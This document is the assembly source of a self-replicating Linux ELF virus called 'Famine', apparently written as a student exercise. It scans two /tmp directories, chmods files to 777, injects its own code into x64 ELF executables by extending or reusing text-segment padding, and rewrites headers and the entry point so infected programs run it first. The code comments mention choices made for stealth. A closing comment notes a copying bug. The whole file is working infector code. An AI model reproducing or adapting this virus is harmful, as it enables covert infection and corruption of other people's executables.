; 1298 bytes

%include "strife.inc"

bits 64
section .text
default rel
global _start

_start:

; ##### VIRUS SETUP AND EXIT #####

	; === Saving some registers ===
	push rdi
	push rsi
	push rcx
	push rdx

	; === Placing our 'famine' struct on the stack ===
	push rbp
	mov rbp, rsp
	sub rsp, famine_size

	; === Loading the address of the directory name string in rdi, and calling _traverse_dir ===
	lea rdi, [rel target_1]
	call _traverse_dir
	lea rdi, [rel target_2]
	call _traverse_dir

	; === Deleting our 'famine' struct from the stack
	add rsp, famine_size

	; === Placing original entry point in r15 (see comment at the end of file) ===
	lea r15, [rel _start]
	mov rsi, [rel virus_entry]
	sub r15, rsi
	add r15, [rel host_entry]

	; === Restoring registers and jumping to original entry point ===
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp r15



; ##### LOOP THROUGH TARGET DIRECTORIES #####

_traverse_dir:
	; === Opening the target directory (path address in rdi) | open(dir, O_RDONLY | O_DIRECTORY, 0) ===
	mov r12, rdi												; Saving name of directory in r12
	mov rsi, O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, SYS_OPEN
	syscall
	mov dword FAM(famine.dir_fd), eax
	cmp rax, 0
	jl _return

	; === Calling getdents to get content of directory | getdents(dir_fd, struc linux_dirent *dirp, count) ===
	mov rdi, rax												; rax has the fd of the "open" call on directory
	lea rsi, FAM(famine.dirents)								; We will store the dirents structure in our 'famine' structure
	mov rdx, DIRENTS_BUFF_SIZE
	mov rax, SYS_GETENTS
	syscall
	cmp rax, 0
	jl .end_dir_loop
	mov r15, rax												; r15 will keep the total size of the dirents structure read by the syscall

	; === Initializing total_dreclen to 0 ===
	xor r8, r8
	mov FAM(famine.total_dreclen), r8

	; === Loop iterating through every entries of current directory ===
	.list_dir:
	xor r14, r14											; r14 will store d_reclen of current dirent
	lea rsi, FAM(famine.dirents)							; rsi will be used to navigate current dirent, and ultimatly store d_name
	add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
	mov r13, rsi											; r13 will store d_type of current dirent
	add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
	mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
	add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
	add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
	sub r14, 1
	add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
	movzx r13, byte [r13]									; r13 has d_type value

	cmp r13, 0x8											; If type is 0x8 (regular file), handle the file ; else, continue the loop
	je _file
	.check_dir_loop:
	cmp qword FAM(famine.total_dreclen), r15				; r15 has total size of the dirents structure (not used in file infection)
	jge .end_dir_loop										; If we already read this size, we finished iterating over entries of directory.
	jmp _traverse_dir.list_dir								; Else, we continue the loop

	; === Closing the directory when we're done ===
	.end_dir_loop:
	movzx rdi, word FAM(famine.dir_fd)
	mov rax, SYS_CLOSE
	syscall
	ret



; ##### FILE INFECTION #####

_file:
	mov qword FAM(famine.map_ptr), 0
	; === Concatenating the directory name and the filename ===
	push rsi													; rsi has filename address. Save it on stack
	lea rdi, FAM(famine.current_fpath)							; We will store the complete path in our 'famine' structure
	mov rsi, r12												; r12 has directory name. 
	mov rdx, rdi												; Saving the complete file path address in rdx

	.dir:														; Copy the directory name to 'famine' structure
	movsb
	cmp byte [rsi], 0
	jne .dir
	pop rsi														; Put the filename in rsi
	.fname:														; Copy the filenameto 'famine' structure and the terminating NULL BYTE
	movsb
	cmp byte [rsi - 1], 0
	jne .fname

	; === chmod 777 on the file to infect, to ensure we have read-write permissions on it ===
	lea rdi, FAM(famine.current_fpath)
	mov rsi, 0q0777
	mov rax, SYS_CHMOD
	syscall

	; === Opening the file to infect | open(fpath, O_RDWR, 0)
	mov rdi, rdx												; rdx had the complete file path address
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov r8, rax													; Storing the file fd in r8 (in preparation of mmap calls)
	cmp rax, 0
	jl _traverse_dir.check_dir_loop

	; === Calculate the size of the file | lseek(file_fd, 0, SEEK_END) ===
	mov rdi, rax
	xor rsi, rsi
	mov rdx, SEEK_END
	mov rax, SYS_LSEEK
	syscall
	mov FAM(famine.fsize), rax									; Saving original file size in 'famine' structure
	mov FAM(famine.mmap_size), rax
	cmp rax, 4
	jl _end_file_infection

	; === First mmap to read the file (format? already infected ?) | mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	xor rdi, rdi
	mov rsi, rax
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	xor r9, r9
	mov rax, SYS_MMAP
	syscall
	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in 'famine' structure
	cmp rax, 0
	jl _end_file_infection

	; === Making sure the file is an ELF file ===
	cmp dword [rax], 0x464c457f
	jne _end_file_infection

	; === Making sure the ELF file is x64 ===
	cmp byte [rax + 0x4], 0x2
	jne _end_file_infection

	; === Making sure the ELF file is ET_EXEC or ET_DYN ===
	cmp word [rax + 0x10], 0x2
	je .segments
	cmp word [rax + 0x10], 0x3
	je .segments
	jmp _end_file_infection

	; === Getting e_phoff and e_phnum ===
	.segments:
	add rax, elf64_ehdr.e_phoff

	mov r11, [rax]												; Storing e_phoff in r11
	add rax, elf64_ehdr.e_phnum - elf64_ehdr.e_phoff
	movzx r14, word [rax]										; Storing e_phnum in r14
	dec r14														; Decrementing by 1 since our counter starts at 0
	mov rax, FAM(famine.map_ptr)
	add rax, r11												; rax is now at the start of segment headers in file
	xor r13, r13												; Counter to loop through segment headers

	; === Finding the text segment in file ===
	.phnum_loop:												; Iterating through segment headers
	call _is_text_segment										; If we found the text segment, go to .found_text_segment
	cmp r14, r13												; Else, check if we still have segments to iterate upon
	je _end_file_infection										; If not, we didn't find the text segment. Give up for this file
	add rax, elf64_phdr_size									; If yes, increase counter and go to next segment
	inc r13
	jmp _file.phnum_loop

	.found_text_segment:										; rax is at beginning of text segment header
	; === Store the text segment header offset ===
	mov rdi, rax
	sub rdi, FAM(famine.map_ptr)
	mov FAM(famine.txt_header), rdi

	; === Store the text segment offset ===
	add rax, elf64_phdr.p_offset
	mov rdi, [rax]
	mov FAM(famine.txt_offset), rdi

	; === Store the text segment vaddr ===
	add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
	mov rdi, [rax]
	mov FAM(famine.txt_vaddr), rdi

	; === Store the text segment filesz ===
	add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
	mov rdi, [rax]
	mov FAM(famine.txt_filesz), rdi

	; === Store the gap size ===
	add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
	mov rdi, [rax]
	mov rsi, FAM(famine.txt_offset)
	add rsi, FAM(famine.txt_filesz)
	sub rdi, rsi
	mov FAM(famine.gap_size), rdi

	; === Check if the file was already infected ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; If the file was already infected, we increased the text segment size by VIRUS_SIZE, so the signature is at txt_offset + txt_filesz
	sub rdi, (_finish - signature)
	mov rax, [rel signature]
	cmp rax, qword [rdi]										; Comparing the word 'Famine' of the signature
	je _end_file_infection										; If the file was already infected, we ignore it

	mov rdi, VIRUS_SIZE
	cmp qword FAM(famine.gap_size), rdi
	jg _inject_in_gap											; If gap_size is greater than VIRUS_SIZE, we will inject in gap for maximum stealth


	; === Close the first mapping with munmap ===
	mov rdi, FAM(famine.map_ptr)
	mov rsi, FAM(famine.mmap_size)
	mov rax, SYS_MUNMAP
	syscall
	mov qword FAM(famine.map_ptr), 0

	; === Truncate the file to add 4096 bytes | ftruncate(file_fd, fsize + 4096) ===
	mov rdi, r8
	mov rsi, FAM(famine.fsize)
	add rsi, PAGE_SIZE
	mov rax, SYS_FTRUNCATE
	syscall
	cmp rax, 0
	jl _end_file_infection

	; === Second mmap of extended file to inject virus | mmap(0, filesize + 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	xor rdi, rdi
	mov rsi, FAM(famine.fsize)
	add rsi, PAGE_SIZE
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	xor r9, r9
	mov rax, SYS_MMAP
	syscall
	mov FAM(famine.map_ptr), rax								; Updating the mapped file pointer in 'famine' structure
	add qword FAM(famine.mmap_size), PAGE_SIZE					; Update the size of the mapped file
	cmp rax, 0
	jl _end_file_infection


	call _text_seg_header_patch


	; === Patching all segment headers corresponding to segments located after the text segment in file. ===
	; === We add 4096 to the offset of these segments, since we will shift everything by PAGE_SIZE ===
	mov rax, FAM(famine.txt_header)
	add rax, FAM(famine.map_ptr)

	.patch_segments:
	add rax, elf64_phdr_size								; Go to next segment
	mov rdi, rax
	add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE			can be optimised by an add qword like sections
	mov rsi, [rdi]
	add rsi, PAGE_SIZE
	mov [rdi], rsi
	add rdi, elf64_phdr.p_vaddr - elf64_phdr.p_offset		; p_vaddr += PAGE_SIZE
	mov rsi, [rdi]
	add rsi, PAGE_SIZE
	mov [rdi], rsi
	add rdi, elf64_phdr.p_paddr - elf64_phdr.p_vaddr
	add qword [rdi], PAGE_SIZE
	
	inc r13
	cmp r13, r14											; r14 still has e_phnum. We check if we patched all segments
	jne .patch_segments										; If not, loop
	

	; === Patching all sections headers corresponding to sections located after the injection point in file. ===
	; === We add 4096 to the offset of these sections, that will be shifter by PAGE_SIZE ===
	mov rax, FAM(famine.map_ptr)
	mov rdi, rax
	add rdi, elf64_ehdr.e_shoff
	mov r11, [rdi]												; r11 stores e_shoff
	add rdi, elf64_ehdr.e_shnum - elf64_ehdr.e_shoff
	movzx r14, word [rdi]										; r14 stores e_shnum
	mov r13, FAM(famine.txt_offset)
	add r13, FAM(famine.txt_filesz)								; r13 stores injection point
	xor r10, r10												; r10 will be our counter
	add rax, r11												; We're at the start of section headers in the mapping

	.patch_sections:
	mov rdi, rax
	add rdi, elf64_shdr.sh_offset
	mov rsi, [rdi]
	cmp r13, rsi												; If the offset of the section is after the injection point...
	jge .pass
	add qword [rdi], PAGE_SIZE									; We add 4096 to their offset, since their content will be shifted
	sub rdi, 0x8
	add qword [rdi], PAGE_SIZE									; adding PAGE_SIZE to virtual addresses of sections too
	.pass:
	inc r10
	cmp r10, r14
	je .patch_elf_header
	add rax, elf64_shdr_size
	jmp .patch_sections

	; === If section headers (e_shoff) are located after injection point, add 4096 to their offset since they will be shifted ===
	.patch_elf_header:
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_shoff
	mov rdi, [rax]
	cmp r13, rdi
	jge .write
	add qword [rax], PAGE_SIZE

	; === Shift all the data after the text segment (and the padding gap) by 4096 bytes in the file ===
	.write:
	mov rsi, FAM(famine.map_ptr)
	add rsi, FAM(famine.fsize)									; rsi is at the end of the original file
	mov rdi, rsi
	add rdi, PAGE_SIZE											; rdi is 4096 bytes after rsi

	mov rax, FAM(famine.map_ptr)
	add rax, FAM(famine.txt_offset)
	add rax, FAM(famine.txt_filesz)
	add rax, FAM(famine.gap_size)								; rax is right after the text segment + padding gap

	mov rcx, rsi												; rcx is at the end of the original file
	sub rcx, rax												; rcx has length to move
	inc rcx
	std															; We start from the end of the file ; move 1 byte from [rsi] to [rdi] ; decrease rsi and rdi, and so on. To decrease rdi and rsi instead of increasing them, we need to switch the DF (direction flag)
	rep movsb													; shift everything by 4096 bytes

	.write_virus:
	; === Patch ELF entry point ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi
	mov rdi, FAM(famine.txt_vaddr)
	add rdi, FAM(famine.txt_filesz)
	mov r13, rdi
	mov [rax], rdi


	; === Write virus at injection point ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	lea rsi, [rel _start]
	mov rcx, VIRUS_SIZE
	cld															; Clear the direction flag since we copy by increasing rsi and rdi normally here
	repnz movsb

	mov qword [rdi - 8], r13
	mov r14, FAM(famine.orig_entry)
	mov qword [rdi - 16], r14

	jmp _end_file_infection



_end_file_infection:
	.munmap:
	mov rdi, FAM(famine.map_ptr)
	cmp rdi, 0													; If we don't have any file mapping yet, just close the file
	je .close_file
	mov rsi, FAM(famine.mmap_size)
	mov rax, SYS_MUNMAP
	syscall
	.close_file:
	mov rdi, r8
	mov rax, SYS_CLOSE
	syscall
	jmp _traverse_dir.check_dir_loop

_inject_in_gap:
	call _text_seg_header_patch
	jmp _file.write_virus

_text_seg_header_patch:
	; === Increasing text segment header p_filesz and p_memsz of VIRUS_SIZE for stealth ===
	mov rax, FAM(famine.map_ptr)
	add rax, FAM(famine.txt_header)
	add rax, elf64_phdr.p_filesz								; p_filesz += VIRUS_SIZE
	mov rdi, [rax]
	add rdi, VIRUS_SIZE
	mov [rax], rdi
	add rax, elf64_phdr.p_memsz - elf64_phdr.p_filesz			; p_memsz += VIRUS_SIZE
	mov rdi, [rax]
	add rdi, VIRUS_SIZE
	mov [rax], rdi
	ret

_is_text_segment:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x1
	jne _return													; If the segment type isn't PT_LOAD, this isn't the text segment
	add rsi, elf64_phdr.p_flags
	mov rsi, [rsi]
	and rsi, 0x1
	cmp rsi, 0x0
	je _return													; If the segment hasn't the flag PF_X (executable), this isn't the text segment
	pop rdi														; Just a pop to delete the return address from the stack and jump
	jmp _file.found_text_segment

_return:
	ret

_exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall

target_1	db		"/tmp/test/",0x0
target_2	db		"/tmp/test2/",0x0
signature	db		"Famine version 1.0 (c)oded by qroland",0x0
host_entry	dq		_exit
virus_entry	dq		_start
_finish:



; x /120i 0x555555569bf1

; shortly after 0x555555569fc8, the virus isn't properly copied (more precisely, right after 0x555555569ff3)
; 